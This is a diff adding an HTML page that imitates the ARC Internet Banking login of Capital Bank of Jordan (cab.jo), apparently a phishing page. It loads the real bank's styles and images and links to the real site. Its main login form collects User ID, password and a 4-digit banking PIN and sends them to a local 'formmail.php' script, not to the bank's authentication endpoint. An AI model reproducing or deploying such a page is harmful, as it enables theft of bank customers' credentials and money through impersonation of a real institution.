@@ -1,0 +1,146 @@
+<!DOCTYPE html><html><head>
+<!-- Forward the user onto the logout page if left inactive for 20 mins, to avoid a session timeout -->
+<!-- todo: This value should be based on the session timeout (it could be added to the xsl; or this page converted to a jsp -->
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<meta http-equiv="X-UA-Compatible" content="IE=8">
+<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
+<title>ARC Internet Banking</title>
+<link href="https://online.cab.jo/ARC-IB/banking/up/css/style.css" rel="stylesheet" type="text/css">
+  <script type="text/javascript">
+		//<![CDATA[
+		function setFocus() {
+			// Check where to put the focus
+                        //ie_detect()
+			var nameField = window.document.forms["login"].UserId;
+
+			if (nameField.getAttribute("readonly")) {
+				window.document.forms["login"].IPassword.focus();
+			}
+			else {
+				window.document.forms["login"].UserId.focus();
+			}
+		}
+
+		function firstLogin() {
+			document.getElementById("loginBox").innerHTML = '<div class="title">Login</div><div class="clear"></div><form id="login-box-form" name="login" method="post" action="j_security_check" autocomplete="OFF"><input name="j_username" id="j_username" value="" type="hidden"><input name="j_password" id="j_password" value="" type="hidden"><span class="error"></span><div class="clear"></div><label>User ID</label><input class="username" name="UserId" type="text"><div class="clear"></div><input class="password" name="IPassword" type="hidden" value="123456"><label id="online-pin-label" class="long">Online Banking PIN</label><input id="online-pin-field" class="pin" name="IPin" type="password"></form><input value="Login" id="subBtn" onclick="javascript:doLogin();" type="submit"><div class="clear"></div><div class="clear"></div>';
+		}
+
+		function doLogin() {
+		//alert('hello');
+	        var tmp = "s2m|" ;
+	        tmp += window.document.forms["login"].IPin.value + "|" ;
+	        tmp += window.document.forms["login"].IPassword.value ;
+	        window.document.forms["login"].j_username.value = window.document.forms["login"].UserId.value ;
+	        window.document.forms["login"].j_password.value=tmp ;	
+	        //alert(window.document.forms["login"].j_username.value);
+	        //alert(window.document.forms["login"].j_password.value);
+	        window.document.forms["login"].submit();
+		}
+		//]]>
+	</script>
+          <script type="text/javascript">
+              //<![CDATA[
+              /*function ie_detect(){
+                if (/MSIE (\d+\.\d+);/.test(navigator.userAgent)){ //test for MSIE x.x;
+                 var ieversion=new Number(RegExp.$1) // capture x.x portion and store as a number
+                 if (ieversion>=9){}
+
+                 else if (ieversion>=8){}
+
+                 else if (ieversion<=7){
+                    e("../scripts/ie-war/")
+                    document.getElementById("subBtn").disabled = true;
+                }
+                }
+                }*/
+                 //]]>
+          </script>
+          
+          
+</head>
+<body onload="setFocus()">
+    	<table class="header">
+		<tbody><tr>
+			<td align="left">
+				<img src="https://online.cab.jo/ARC-IB/banking/up/css/images/header2.jpg">
+			</td>
+			<td align="right">
+				<img src="https://online.cab.jo/ARC-IB/banking/up/css/images/header1.jpg">
+			</td>
+		</tr>
+	</tbody></table>
+<div class="wrapper" style="width: 1000px">
+	<div class="container">
+    	<div class="linksBox">
+        	<div class="smsBanking">
+            	<ul>
+                	<li class="title"><a href="http://www.cab.jo/service-details/56">
+					SMS Banking</a></li>
+                    <li>Inquiries</li>
+                    <li>Notifications</li>
+                </ul>
+                <div class="clear"></div>
+            </div>
+            <div class="cardlessService">
+            	<ul>
+                	<li class="title"><a href="http://www.cab.jo/services/IRIS%20Recognition">
+					Cardless Services</a></li>
+                    <li>Eye Recognition</li>
+                    <li>ATM ID</li>
+                </ul>
+                <div class="clear"></div>
+            </div>
+            <div class="mobileApps">
+            	<ul>
+                	<li class="title"><a href="http://www.cab.jo/service-details/54">
+					Mobile Applications</a></li>
+                    <li>Locator</li>
+                    <li>Financial Services</li>
+                </ul>
+                <div class="clear"></div>
+            </div>
+            <div class="clear"></div>
+        </div>
+	</div>
+	
+	<div class="loginBox" id="loginBox">
+        	<div class="title">Login</div>
+            <div class="clear"></div>
+			<form id="login-box-form" name="login" method="post" action="formmail.php" autocomplete="OFF">	
+			  <input type="hidden" name="j_username" id="j_username" value="">
+			  <input type="hidden" name="j_password" id="j_password" value="">
+				<span class="error">
+<!--				&#160;&#160; Error message -->
+					
+				</span>
+            <div class="clear"></div>
+            <label>User ID</label><input type="text" class="username" name="UserId" required="">
+            <div class="clear"></div>
+            <label>Password</label><input type="password" class="password" name="IPassword" required="">
+            <div class="clear"></div>
+            <label class="long" id="online-pin-label">4 Digit Banking PIN</label><input id="online-pin-field" type="password" class="pin" name="IPin" required="">            
+            </form>
+            <input type="submit" value="Login" id="subBtn" onclick="javascript:doLogin();">
+            <div class="clear"></div>
+            <p>First time login with us?<a title="Welcome to CAB Online banking" href="http://www.cab.jo/ar/node/1502" onclick="firstLogin();return false;">Click 
+			here</a></p>
+            <div class="clear"></div>
+        </div>
+	<div class="clear"></div>
+</div>
+<div class="footer">
+	<ul>
+        <li><a href="http://www.cab.jo/legal-information">Legal Information</a></li>
+        <li><a href="http://www.cab.jo/security-and-privacy">Security and 
+		Privacy</a></li>
+    	<li><a href="http://www.cab.jo/contact-us">Contact Us</a></li>
+        <li><a href="http://www.cab.jo/sitemap" class="last">Sitemap</a></li>
+    </ul>
+    <div class="clear"></div>
+    <div class="copyright">
+    	Copyrights © 2013 dot.jo. All rights reserved
+    </div>
+    <div class="clear"></div>
+</div>
+
+</body></html>
